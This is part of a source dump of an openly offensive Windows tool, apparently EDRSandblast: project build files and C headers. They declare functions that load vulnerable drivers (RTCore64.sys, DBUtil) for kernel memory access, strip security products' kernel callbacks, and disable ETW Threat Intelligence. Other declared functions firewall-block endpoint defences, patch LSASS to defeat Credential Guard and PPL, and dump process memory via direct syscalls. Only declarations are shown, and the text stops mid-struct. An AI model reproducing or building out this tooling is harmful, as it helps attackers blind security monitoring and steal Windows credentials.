    <ClCompile Include="Utils\SW2_Syscalls.c" />
    <ClCompile Include="Utils\SyscallProcessUtils.c" />
    <ClCompile Include="Utils\WdigestOffsets.c" />
    <ClCompile Include="Utils\WindowsServiceOps.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="EDRSandblast.h" />
    <ClInclude Include="Includes\CredGuard.h" />
    <ClInclude Include="Includes\DriverDBUtil.h" />
    <ClInclude Include="Includes\DriverRTCore.h" />
    <ClInclude Include="Includes\ProcessDumpDirectSyscalls.h" />
    <ClInclude Include="Includes\FileUtils.h" />
    <ClInclude Include="Includes\HttpClient.h" />
    <ClInclude Include="Includes\DriverOps.h" />
    <ClInclude Include="Includes\ETWThreatIntel.h" />
    <ClInclude Include="Includes\FileVersion.h" />
    <ClInclude Include="Includes\Firewalling.h" />
    <ClInclude Include="Includes\FirewallOps.h" />
    <ClInclude Include="Includes\IsEDRChecks.h" />
    <ClInclude Include="Includes\IsElevatedProcess.h" />
    <ClInclude Include="Includes\KernelCallbacks.h" />
    <ClInclude Include="Includes\KernelMemoryPrimitives.h" />
    <ClInclude Include="Includes\KernelPatternSearch.h" />
    <ClInclude Include="Includes\KernelUtils.h" />
    <ClInclude Include="Includes\ListUtils.h" />
    <ClInclude Include="Includes\ProcessDump.h" />
    <ClInclude Include="Includes\RemotePEBBrowser.h" />
    <ClInclude Include="Includes\NtoskrnlOffsets.h" />
    <ClInclude Include="Includes\PEBBrowse.h" />
    <ClInclude Include="Includes\PEParser.h" />
    <ClInclude Include="Includes\RunAsPPL.h" />
    <ClInclude Include="Includes\SignatureOps.h" />
    <ClInclude Include="Includes\StringUtils.h" />
    <ClInclude Include="Includes\SW2_Syscalls.h" />
    <ClInclude Include="Includes\SyscallProcessUtils.h" />
    <ClInclude Include="Includes\Syscalls.h" />
    <ClInclude Include="Includes\Undoc.h" />
    <ClInclude Include="Includes\Undoc_64.h" />
    <ClInclude Include="Includes\UserlandHooks.h" />
    <ClInclude Include="Includes\WdigestOffsets.h" />
    <ClInclude Include="Includes\WindowsServiceOps.h" />
    <ClInclude Include="Includes\PdbSymbols.h" />
    <ClInclude Include="Includes\ObjectCallbacks.h" />
  </ItemGroup>
  <ItemGroup>
    <MASM Include="Utils\SW2_Syscalls_stubs.x64.asm">
      <ExcludedFromBuild Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">true</ExcludedFromBuild>
      <DeploymentContent Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">true</DeploymentContent>
      <ExcludedFromBuild Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">true</ExcludedFromBuild>
      <DeploymentContent Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">true</DeploymentContent>
      <ExcludedFromBuild Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">false</ExcludedFromBuild>
      <DeploymentContent Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">true</DeploymentContent>
      <ExcludedFromBuild Condition="'$(Configuration)|$(Platform)'=='Release|x64'">false</ExcludedFromBuild>
      <DeploymentContent Condition="'$(Configuration)|$(Platform)'=='Release|x64'">true</DeploymentContent>
    </MASM>
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.targets" />
  </ImportGroup>
</Project>
```

`EDRSandblast/EDRSandblast.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="LSASSProtectionBypass\CredGuard.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="LSASSProtectionBypass\RunAsPPL.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Utils\KernelMemoryPrimitives.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Utils\DriverOps.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Utils\FileVersion.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Utils\KernelPatternSearch.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Utils\NtoskrnlOffsets.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Utils\WdigestOffsets.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Utils\FirewallOps.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Utils\IsEDRChecks.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Utils\IsElevatedProcess.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Utils\WindowsServiceOps.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Utils\SignatureOps.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="KernellandBypass\ETWThreatIntel.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="KernellandBypass\KernelCallbacks.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="UserlandBypass\Firewalling.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="UserlandBypass\UserlandHooks.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Utils\PdbSymbols.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Utils\HttpClient.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Utils\FileUtils.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="KernellandBypass\ObjectCallbacks.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Utils\SW2_Syscalls.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="KernellandBypass\KernelUtils.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Drivers\DriverRTCore.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Utils\SyscallProcessUtils.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Drivers\DriverDBUtil.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Utils\StringUtils.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Utils\PEParser.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Utils\PEBBrowse.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Utils\RemotePEBBrowser.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Utils\ListUtils.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="UserlandBypass\Syscalls.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="Utils\ProcessDump.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="UserlandBypass\ProcessDumpDirectSyscalls.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="Includes\CredGuard.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\RunAsPPL.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\KernelMemoryPrimitives.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\DriverOps.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\FileVersion.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\KernelPatternSearch.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\NtoskrnlOffsets.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\WdigestOffsets.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\KernelCallbacks.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\ETWThreatIntel.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\PEBBrowse.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\PEParser.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\Undoc.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\Undoc_64.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\UserlandHooks.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\Firewalling.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\FirewallOps.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\IsElevatedProcess.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\WindowsServiceOps.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\SignatureOps.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\IsEDRChecks.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\PdbSymbols.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\HttpClient.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\FileUtils.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\ObjectCallbacks.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\KernelUtils.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\DriverRTCore.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\DriverDBUtil.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\SyscallProcessUtils.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\SW2_Syscalls.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\StringUtils.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\RemotePEBBrowser.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\ListUtils.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\Syscalls.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\ProcessDump.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="Includes\ProcessDumpDirectSyscalls.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="EDRSandblast.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <MASM Include="Utils\SW2_Syscalls_stubs.x64.asm">
      <Filter>Source Files</Filter>
    </MASM>
  </ItemGroup>
</Project>
```

`EDRSandblast/Includes/CredGuard.h`:

```h
#pragma once

#include <Windows.h>

DWORD WINAPI disableCredGuardByPatchingLSASS(void);

```

`EDRSandblast/Includes/DriverDBUtil.h`:

```h
#pragma once

#include <Windows.h>

HANDLE GetDriverHandle_DBUtil();
VOID CloseDriverHandle_DBUtil();
VOID WriteMemoryPrimitive_DBUtil(SIZE_T Size, DWORD64 Address, PVOID Buffer);
VOID ReadMemoryPrimitive_DBUtil(SIZE_T Size, DWORD64 Address, PVOID Buffer);

```

`EDRSandblast/Includes/DriverOps.h`:

```h
/*

--- Driver install / uninstall functions.
--- Source and credit: https://github.com/gentilkiwi/mimikatz

*/

#pragma once
#include <Windows.h>

#if !defined(PRINT_ERROR_AUTO)
#define PRINT_ERROR_AUTO(func) _tprintf_or_not(TEXT("[!] ERROR ") TEXT(__FUNCTION__) TEXT(" ; ") func TEXT(" (0x%08x)\n"), GetLastError())
#endif

#define SERVICE_NAME_LENGTH 8
#define MAX_UNINSTALL_ATTEMPTS 3
#define OP_SLEEP_TIME 1000

TCHAR* GetDriverServiceName(void);
void SetDriverServiceName(_In_z_ TCHAR* newName);

BOOL InstallVulnerableDriver(TCHAR* driverPath);

BOOL UninstallVulnerableDriver(void);
BOOL IsDriverServiceRunning(LPTSTR driverPath, LPTSTR* serviceName);

```

`EDRSandblast/Includes/DriverRTCore.h`:

```h
#pragma once

#include <Windows.h>

HANDLE GetDriverHandle_RTCore();
VOID CloseDriverHandle_RTCore();
VOID WriteMemoryPrimitive_RTCore(SIZE_T Size, DWORD64 Address, PVOID Buffer);
VOID ReadMemoryPrimitive_RTCore(SIZE_T Size, DWORD64 Address, PVOID Buffer);

```

`EDRSandblast/Includes/ETWThreatIntel.h`:

```h
/*

--- ETW Threat Intelligence operations.
--- Inspiration and credit: https://public.cnotools.studio/bring-your-own-vulnerable-kernel-driver-byovkd/exploits/data-only-attack-neutralizing-etwti-provider

*/

#pragma once

#include <Windows.h>

#define DISABLE_PROVIDER 0x0
#define ENABLE_PROVIDER 0x1

DWORD64 GetEtwThreatIntProvRegHandleAddress();

DWORD64 GetEtwThreatInt_ProviderEnableInfoAddress(BOOL verbose);

void DisableETWThreatIntelProvider(BOOL verbose);

void EnableETWThreatIntelProvider(BOOL verbose);

BOOL isETWThreatIntelProviderEnabled(BOOL verbose);
```

`EDRSandblast/Includes/FileUtils.h`:

```h
#pragma once

PBYTE ReadFullFileW(LPCWSTR fileName);

BOOL FileExistsA(LPCSTR szPath);
BOOL FileExistsW(LPCWSTR szPath);
#ifdef UNICODE
#define FileExists  FileExistsW
#else
#define FileExists  FileExistsA
#endif // !UNICODE

BOOL WriteFullFileW(LPCWSTR fileName, PBYTE fileContent, SIZE_T fileSize);
```

`EDRSandblast/Includes/FileVersion.h`:

```h
#pragma once

#include <Windows.h>

LPTSTR GetNtoskrnlPath();

void GetFileVersion(TCHAR* buffer, SIZE_T bufferLen, TCHAR* filename);

LPTSTR GetNtoskrnlVersion();

LPTSTR GetWdigestVersion();
```

`EDRSandblast/Includes/FirewallOps.h`:

```h
#pragma once

#include <Windows.h>
#pragma warning(disable : 4201)
#include <netfw.h>
#pragma warning(default : 4201)

#include <Tchar.h>
#include <stdio.h>

#include "StringUtils.h"

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef FW_PROFILE_TYPE_ALL
#define FW_PROFILE_TYPE_ALL 0x7FFFFFFF
#endif

#define FW_RULE_NAME_MAX_LENGTH 20

HRESULT IsFirewallEnabled(BOOL* firewallIsOn);

HRESULT CreateFirewallRuleBlockBinary(TCHAR* binaryPath, NET_FW_RULE_DIRECTION direction, TCHAR* ruleName);

HRESULT DeleteFirewallRule(TCHAR * ruleName);

```

`EDRSandblast/Includes/Firewalling.h`:

```h
/*

--- Firewall rules to block EDR products from the network (inboud / outbound connections).

*/

#pragma once

#include <Windows.h>
#include <Dbghelp.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <Tchar.h>

#include "FirewallOps.h"
#include "IsEDRChecks.h"
#include "IsElevatedProcess.h"

// Singly-linked list used to hold the paths of binaries executed by EDRs (processes / services).
typedef struct sFwBinaryRules_ {
    TCHAR* binaryPath;
    TCHAR* ruleInboundName;
    TCHAR* ruleOutboundName;
    struct sFwBinaryRules_* next;
} fwBinaryRules;

typedef struct fwBlockingRulesList_ {
    fwBinaryRules* first;
}fwBlockingRulesList;

void FirewallPrintManualDeletion(fwBlockingRulesList* fwEntries);

HRESULT FirewallBlockEDR(fwBlockingRulesList* fwEntries);

HRESULT FirewallUnblockEDR(fwBlockingRulesList* fwEntries);

void fwList_insertSorted(fwBlockingRulesList* fwEntries, fwBinaryRules* newFWEntry);
```

`EDRSandblast/Includes/HttpClient.h`:

```h
#pragma once
BOOL HttpsDownloadFullFile(LPCWSTR domain, LPCWSTR uri, PBYTE* output, SIZE_T* output_size);
```

`EDRSandblast/Includes/IsEDRChecks.h`:

```h
/*
* Primitives to check if a binary or driver belongs to an EDR product.
*/

#pragma once

#include <Windows.h>
#include <Tchar.h>

#include "SignatureOps.h"

TCHAR const* EDR_SIGNATURE_KEYWORDS[];
TCHAR const* EDR_BINARIES[];
TCHAR const* EDR_DRIVERS[];

BOOL isFileSignatureMatchingEDR(TCHAR* filePath);

BOOL isBinaryNameMatchingEDR(TCHAR* binaryName);

BOOL isBinaryPathMatchingEDR(TCHAR* binaryPath);

BOOL isDriverNameMatchingEDR(TCHAR* driverName);

BOOL isDriverPathMatchingEDR(TCHAR* driverPath);
```

`EDRSandblast/Includes/IsElevatedProcess.h`:

```h
#pragma once

#include "Windows.h"
#include "Tchar.h"

#pragma comment(lib, "netapi32.lib")

BOOL IsElevatedProcess();
```

`EDRSandblast/Includes/KernelCallbacks.h`:

```h
/*

--- Kernel callbacks operations.
--- Inspiration and credit: https://github.com/br-sn/CheekyBlinder

*/

#pragma once

#include <Windows.h>


/*
* PspCreateProcessNotifyRoutine / PspCreateThreadNotifyRoutine max: 64 callbacks
* PspLoadImageNotifyRoutine max: 8 callbacks
* Source: https://blog.gentilkiwi.com/retro-ingenierie/windbg-notifications-kernel
*/
#define PSP_MAX_CALLBACKS 0x40

//TODO : split notify routines & object callbacks in different files, but keep this base to implement more kernel callbacks types (CMRegisterCallbacks, etc)
enum kernel_callback_type_e {
    NOTIFY_ROUTINE_CB,
    OBJECT_CALLBACK
};
struct KRNL_CALLBACK {
    enum kernel_callback_type_e type;
    TCHAR const* driver_name;
    union callback_addr_e {
        struct notify_routine_t {
            DWORD64 callback_struct_addr;
            DWORD64 callback_struct;
            enum NtoskrnlOffsetType type; //TODO : decorrelate indices in CSV from notify routine types
        } notify_routine;
        struct object_callback_t {
            DWORD64 enable_addr;
        } object_callback;
    } addresses;
    DWORD64 callback_func;
    BOOL removed;
};

struct FOUND_EDR_CALLBACKS {
    DWORD64 index;
    struct KRNL_CALLBACK EDR_CALLBACKS[256];
};



BOOL isDriverEDR(TCHAR* driver);
void RestoreEDRNotifyRoutineCallbacks(struct FOUND_EDR_CALLBACKS* edrDrivers);

/*

------ Process (PspCreateProcessNotifyRoutine) callbacks.

*/

DWORD64 GetPspCreateProcessNotifyRoutineAddress(void);

void EnumPspCreateProcessNotifyRoutine(struct FOUND_EDR_CALLBACKS* edrDrivers, BOOL verbose);

void RemoveEDRProcessNotifyCallbacks(struct FOUND_EDR_CALLBACKS* edrDrivers, BOOL verbose);

/*

------ Thread (PspCreateThreadNotifyRoutine) callbacks.

*/

DWORD64 GetPspCreateThreadNotifyRoutineAddress(void);

void EnumPspCreateThreadNotifyRoutine(struct FOUND_EDR_CALLBACKS* edrDrivers, BOOL verbose);

void RemoveEDRThreadNotifyCallbacks(struct FOUND_EDR_CALLBACKS* edrDrivers, BOOL verbose);

/*

------ Image loading (PspLoadImageNotifyRoutine) callbacks.

*/

DWORD64 GetPspLoadImageNotifyRoutineAddress(void);

void EnumPspLoadImageNotifyRoutine(struct FOUND_EDR_CALLBACKS* edrDrivers, BOOL verbose);

void RemoveEDRImageNotifyCallbacks(struct FOUND_EDR_CALLBACKS* edrDrivers, BOOL verbose);

/*

------ All EDR Kernel callbacks enumeration / removal.

*/

BOOL EnumEDRNotifyRoutineCallbacks(struct FOUND_EDR_CALLBACKS* edrDrivers, BOOL verbose);

void RemoveEDRNotifyRoutineCallbacks(struct FOUND_EDR_CALLBACKS* edrDrivers);

```

`EDRSandblast/Includes/KernelMemoryPrimitives.h`:

```h
/*

--- Kernel memory Read / Write primitives through the vulnerable Micro-Star MSI Afterburner driver.
--- Source and credit: https://github.com/Barakat/CVE-2019-16098/blob/master/CVE-2019-16098.cpp

*/

#pragma once

#include <Windows.h>

#define RTCore 0
#define DBUtil 1
// Select the driver to use with the following #define
#define VULN_DRIVER RTCore

#if VULN_DRIVER == RTCore
#define DEFAULT_DRIVER_FILE TEXT("RTCore64.sys")
#define CloseDriverHandle CloseDriverHandle_RTCore
#define ReadMemoryPrimitive ReadMemoryPrimitive_RTCore
#define WriteMemoryPrimitive WriteMemoryPrimitive_RTCore
#elif VULN_DRIVER == DBUtil
#define DEFAULT_DRIVER_FILE TEXT("DBUtil_2_3.sys")
#define CloseDriverHandle CloseDriverHandle_DBUtil
#define ReadMemoryPrimitive ReadMemoryPrimitive_DBUtil
#define WriteMemoryPrimitive WriteMemoryPrimitive_DBUtil
#endif


BYTE    ReadMemoryBYTE(DWORD64 Address);
WORD    ReadMemoryWORD(DWORD64 Address);
DWORD   ReadMemoryDWORD(DWORD64 Address);
DWORD64 ReadMemoryDWORD64(DWORD64 Address);

BYTE    ReadKernelMemoryBYTE(DWORD64 Offset);
WORD    ReadKernelMemoryWORD(DWORD64 Offset);
DWORD   ReadKernelMemoryDWORD(DWORD64 Offset);
DWORD64 ReadKernelMemoryDWORD64(DWORD64 Offset);

VOID ReadMemory(DWORD64 Address, PVOID Buffer, SIZE_T Size);

void WriteMemoryBYTE(DWORD64 Address, BYTE Value);
void WriteMemoryWORD(DWORD64 Address, WORD Value);
void WriteMemoryDWORD(DWORD64 Address, DWORD Value);
void WriteMemoryDWORD64(DWORD64 Address, DWORD64 Value);

void WriteKernelMemoryBYTE(DWORD64 Offset, BYTE Value);
void WriteKernelMemoryWORD(DWORD64 Offset, WORD Value);
void WriteKernelMemoryDWORD(DWORD64 Offset, DWORD Value);
void WriteKernelMemoryDWORD64(DWORD64 Offset, DWORD64 Value);

VOID WriteMemory(DWORD64 Address, PVOID Buffer, SIZE_T Size);

VOID CloseDriverHandle();

BOOL TestReadPrimitive();

```

`EDRSandblast/Includes/KernelPatternSearch.h`:

```h
/*

--- ntoskrnl Notify Routines' offsets search functions using patterns.
--- Ultimately not used because too unreliable and too prone to BSoD.

*/

#pragma once

#include <Windows.h>

DWORD64 PatternSearchStartingFromAddress(HANDLE Device, DWORD64 startAddress, DWORD bytesToScan, DWORD64 pattern, DWORD64 mask);

DWORD64 ExtractRelativeAddress(HANDLE Device, DWORD64 instructionStartAddress, DWORD64 instructionRelativeAddressOffset, DWORD64 nextInstructionOffset);

DWORD64 GetPspCreateProcessNotifyRoutineAddressUsingPattern(void);

DWORD64 GetPspCreateThreadNotifyRoutineAddressUsingPattern(void);

DWORD64 GetPspLoadImageNotifyRoutineAddressUsingPattern(void);
```

`EDRSandblast/Includes/KernelUtils.h`:

```h
#pragma once
#include <Windows.h>

DWORD64 FindNtoskrnlBaseAddress(void);
TCHAR* FindDriverName(DWORD64 address, _Out_opt_ PDWORD64 offset);
TCHAR* FindDriverPath(DWORD64 address);
DWORD64 GetKernelFunctionAddress(LPCSTR function);

```

`EDRSandblast/Includes/ListUtils.h`:

```h
#include <Windows.h>

typedef struct _LINKED_LIST {
	struct _LINKED_LIST* next;
} LINKED_LIST, * PLINKED_LIST;

VOID freeLinkedList(PVOID head);
```

`EDRSandblast/Includes/NtoskrnlOffsets.h`:

```h
/*

--- ntoskrnl Notify Routines' offsets from CSV functions.
--- Hardcoded patterns, with offsets for 350+ ntoskrnl versions provided in the CSV file.

*/

#pragma once

#include <Windows.h>


enum NtoskrnlOffsetType {
    CREATE_PROCESS_ROUTINE,
    CREATE_THREAD_ROUTINE,
    LOAD_IMAGE_ROUTINE,
    PROTECTION_LEVEL,
    ETW_THREAT_INT_PROV_REG_HANDLE,
    ETW_REG_ENTRY_GUIDENTRY,
    ETW_GUID_ENTRY_PROVIDERENABLEINFO,
    PSPROCESSTYPE,
    PSTHREADTYPE,
    OBJECT_TYPE_CALLBACKLIST,
    _SUPPORTED_NTOSKRNL_OFFSETS_END
};

union NtoskrnlOffsets {
    // structure version of ntoskrnl.exe's offsets
    struct {
        // ntoskrnl's PspCreateProcessNotifyRoutine
        DWORD64 pspCreateProcessNotifyRoutine;
        // ntoskrnl's PspCreateThreadNotifyRoutine
        DWORD64 pspCreateThreadNotifyRoutine;
        // ntoskrnl's PspLoadImageNotifyRoutine
        DWORD64 pspLoadImageNotifyRoutine;
        // ntoskrnl EPROCESS's Protection field offset
        DWORD64 eprocess_protection;
        // ntoskrnl ETW Threat Intelligence's EtwThreatIntProvRegHandle
        DWORD64 etwThreatIntProvRegHandle;
        // ntoskrnl _ETW_REG_ENTRY's GuidEntry
        DWORD64 etwRegEntry_GuidEntry;
        // ntoskrnl _ETW_GUID_ENTRY's ProviderEnableInfo
        DWORD64 etwGuidEntry_ProviderEnableInfo;
        // ntoskrnl PsProcessType symbol offset
        DWORD64 psProcessType;
        // ntoskrnl PsThreadType symbol offset
        DWORD64 psThreadType;
        // ntoskrnl _OBJECT_TYPE's CallbackList symbol offset
        DWORD64 object_type_callbacklist;
    } st;

    // array version (usefull for code factoring)
    DWORD64 ar[_SUPPORTED_NTOSKRNL_OFFSETS_END];
};

union NtoskrnlOffsets g_ntoskrnlOffsets;

// Stores, in a global variable, the offsets of nt!PspCreateProcessNotifyRoutine, nt!PspCreateThreadNotifyRoutine, nt!PspLoadImageNotifyRoutine, and nt!_PS_PROTECTION for the specific Windows version in use.
void LoadNtoskrnlOffsetsFromFile(TCHAR* ntoskrnlOffsetFilename);

// Saves the offsets, stored in global variable, in the provided CSV file
void SaveNtoskrnlOffsetsToFile(TCHAR* ntoskrnlOffsetFilename);

// Print the Ntosknrl offsets.
void PrintNtoskrnlOffsets();

void LoadNtoskrnlOffsetsFromInternet(BOOL delete_pdb);

BOOL NtoskrnlOffsetsAreAllPresent();
BOOL NtoskrnlAllKernelCallbacksOffsetsArePresent();
BOOL NtoskrnlNotifyRoutinesOffsetsArePresent();
BOOL NtoskrnlEtwtiOffsetsArePresent();
BOOL NtoskrnlObjectCallbackOffsetsArePresent();
```

`EDRSandblast/Includes/ObjectCallbacks.h`:

```h
#pragma once
#include <Windows.h>

#define DECLARE_OFFSET(STRUCTNAME, OFFSETNAME) DWORD64 Offset_ ## STRUCTNAME ## _ ## OFFSETNAME
#define DECLARE_SYMBOL(SYMBOL) DWORD64 Sym_ ## SYMBOL

// Offset used in experimental functions (EnumAllObjectsCallbacks, EnableDisableProcessAndThreadObjectsCallbacksSupport)
DECLARE_OFFSET(_OBJECT_TYPE, Name);
DECLARE_OFFSET(_OBJECT_TYPE, TotalNumberOfObjects);
DECLARE_OFFSET(_OBJECT_TYPE, TypeInfo);
DECLARE_OFFSET(_OBJECT_TYPE_INITIALIZER, ObjectTypeFlags);
DECLARE_SYMBOL(ObpObjectTypes);
DECLARE_SYMBOL(ObpTypeObjectType);


//callback support strategy
void EnableDisableProcessAndThreadObjectsCallbacksSupport(BOOL enable);
BOOL AreProcessAndThreadsObjectsCallbacksSupportEnabled();

//undoc struct strategy
void EnumAllObjectsCallbacks();
BOOL EnumEDRProcessAndThreadObjectsCallbacks(struct FOUND_EDR_CALLBACKS* FoundObjectCallbacks);
void EnableEDRProcessAndThreadObjectsCallbacks(struct FOUND_EDR_CALLBACKS* FoundObjectCallbacks);
void DisableEDRProcessAndThreadObjectsCallbacks(struct FOUND_EDR_CALLBACKS* FoundObjectCallbacks);
void EnableDisableAllProcessAndThreadObjectsCallbacks(BOOL enable);

//full black box strategy
SIZE_T CountProcessAndThreadObjectsCallbacks();
void RemoveAllProcessAndThreadObjectsCallbacks();
void RestoreAllProcessAndThreadObjectsCallbacks();
```

`EDRSandblast/Includes/PEBBrowse.h`:

```h
#pragma once
#include "Undoc.h"

LDR_DATA_TABLE_ENTRY* getModuleEntryFromAbsoluteAddr(PVOID addr);
LDR_DATA_TABLE_ENTRY* getModuleEntryFromNameW(const WCHAR* name);
LDR_DATA_TABLE_ENTRY* getNextModuleEntryInLoadOrder(LDR_DATA_TABLE_ENTRY* curr);

#if _WIN64
PEB64* getPEB();
TEB64* getTEB();
#else
PEB* getPEB(void);
TEB* getTEB(void);
#endif
```

`EDRSandblast/Includes/PEParser.h`:

```h
#pragma once
#pragma warning (disable:4214) //Warning Level 4: C4214: nonstandard extension used : bit field types other than int

#include <Windows.h>

typedef unsigned __int64    QWORD;

typedef struct _IMAGE_RELOCATION_ENTRY {
	WORD Offset : 12;
	WORD Type : 4;
} IMAGE_RELOCATION_ENTRY;

typedef struct PE_relocation_t {
	DWORD RVA;
	WORD Type : 4;
} PE_relocation;

typedef struct PE_codeview_debug_info_t {
	DWORD signature;
	GUID guid;
	DWORD age;
	CHAR pdbName[1];
} PE_codeview_debug_info;

typedef struct PE_pointers {
	BOOL isMemoryMapped;
	BOOL isInAnotherAddressSpace;
	HANDLE hProcess;
	PVOID baseAddress;
	//headers ptrs
	IMAGE_DOS_HEADER* dosHeader;
	IMAGE_NT_HEADERS* ntHeader;
	IMAGE_OPTIONAL_HEADER* optHeader;
	IMAGE_DATA_DIRECTORY* dataDir;
	IMAGE_SECTION_HEADER* sectionHeaders;
	//export info
	IMAGE_EXPORT_DIRECTORY* exportDirectory;
	LPDWORD exportedNames;
